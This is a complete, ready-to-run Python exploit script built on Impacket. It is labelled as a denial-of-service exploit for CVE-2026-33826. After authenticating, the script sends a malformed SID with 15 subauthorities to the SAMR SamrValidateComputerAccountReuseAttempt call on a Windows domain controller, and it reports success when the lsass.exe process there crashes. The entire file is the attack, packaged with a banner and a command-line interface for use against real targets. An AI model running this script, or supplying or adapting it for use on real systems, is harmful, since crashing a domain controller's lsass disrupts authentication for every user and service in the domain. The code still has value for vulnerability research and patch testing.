#!/usr/bin/env python3
"""Issue one protocol-valid SamrValidateComputerAccountReuseAttempt request."""

import argparse
import getpass

from impacket.dcerpc.v5 import samr, transport
from impacket.dcerpc.v5.dtypes import BOOL, RPC_SID, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.examples.utils import parse_target
from impacket.smb import SessionError as SMB1SessionError
from impacket.smb3 import SessionError as SMB3SessionError
from impacket.smbconnection import SessionError as SMBConnectionSessionError

BANNER = r"""
   __                       __             _
  /__\ ___ _   _ ___  ___  /__\_   _ _ __ | |_ _   _ _ __ ___
 / \/// _ \ | | / __|/ _ \/ \// | | | '_ \| __| | | | '__/ _ \
/ _  \  __/ |_| \__ \  __/ _  \ |_| | |_) | |_| |_| | | |  __/
\/ \_/\___|\__,_|___/\___\/ \_/\__,_| .__/ \__|\__,_|_|  \___|
                                    |_|
""".strip("\n")


class SamrValidateComputerAccountReuseAttempt(NDRCALL):
    opnum = 74
    structure = (
        ("ServerHandle", samr.SAMPR_HANDLE),
        # Top-level [in] PRPC_SID is an RPC reference pointer and is encoded
        # inline, matching Impacket's SamrOpenDomain representation.
        ("ComputerSid", RPC_SID),
    )


class SamrValidateComputerAccountReuseAttemptResponse(NDRCALL):
    structure = (
        ("Result", BOOL),
        ("ErrorCode", ULONG),
    )


OPNUMS = {
    74: (
        SamrValidateComputerAccountReuseAttempt,
        SamrValidateComputerAccountReuseAttemptResponse,
    ),
}

STATUS_INVALID_PARAMETER = 0xC000000D
STATUS_PIPE_BROKEN = 0xC000014B


def build_sid(count):
    # S-1-5-21 plus enough arbitrary subauthorities to reach the requested count.
    authorities = [21] + list(range(1, count))
    sid = RPC_SID()
    sid.fromCanonical("S-1-5-" + "-".join(map(str, authorities)))
    return sid


def print_banner():
    banner_lines = BANNER.splitlines()
    metadata_lines = [
        r"Author: muzz\x00",
        "Discovered: 2026-06-09",
        "CVE-2026-33826",
        "Authenticated Stack Overflow-based Domain Controller Denial Of Service Exploit",
    ]
    lines = banner_lines + [""] + metadata_lines
    width = max(map(len, lines))
    banner_width = max(map(len, banner_lines))
    print("┌" + "─" * (width + 2) + "┐")
    for line in banner_lines:
        art_line = f"{line:<{banner_width}}"
        print(f"│ {art_line:^{width}} │")
    print(f"│ {'':{width}} │")
    for line in metadata_lines:
        print(f"│ {line:^{width}} │")
    print("└" + "─" * (width + 2) + "┘")


def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="Send one valid SID with 7-15 subauthorities to SAMR opnum 74."
    )
    parser.add_argument("target", help="[[domain/]username[:password]@]<target>")
    args = parser.parse_args()

    domain, username, password, address = parse_target(args.target)
    if not username:
        parser.error("an authenticated domain account is required")
    if password == "":
        password = getpass.getpass("Password: ")

    lmhash = nthash = ""

    print("[*] Setting credentials...")
    rpc_transport = transport.DCERPCTransportFactory(rf"ncacn_np:{address}[\pipe\samr]")
    rpc_transport.set_credentials(username, password, domain, lmhash, nthash)

    print("[*] Authenticating toward DC's RPC Host...")
    dce = rpc_transport.get_dce_rpc()
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)

    print("[*] Connecting to SAMR...")
    connect = samr.hSamrConnect5(dce)
    request = SamrValidateComputerAccountReuseAttempt()
    request["ServerHandle"] = connect["ServerHandle"]
    request["ComputerSid"] = build_sid(15)

    print(
        f"[*] Calling SamrValidateComputerAccountReuseAttempt with malformed SID ({8 + 4 * 15} bytes)..."
    )
    try:
        response = dce.request(request, checkError=False)
    except (SMB1SessionError, SMB3SessionError, SMBConnectionSessionError) as exc:
        if isinstance(exc, SMBConnectionSessionError):
            error_code = exc.getErrorCode()
        else:
            error_code = exc.get_error_code()

        if error_code == STATUS_PIPE_BROKEN:
            print("[SUCCESS] SAMR pipe broken; DC lsass.exe crashed!")
            return 0
        raise

    status = int(response["ErrorCode"])
    if status == STATUS_INVALID_PARAMETER:
        print("[FAILED] The request was rejected; the target appears patched.")
        return 1

    print("[UNKNOWN] The target returned an unexpected response.")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
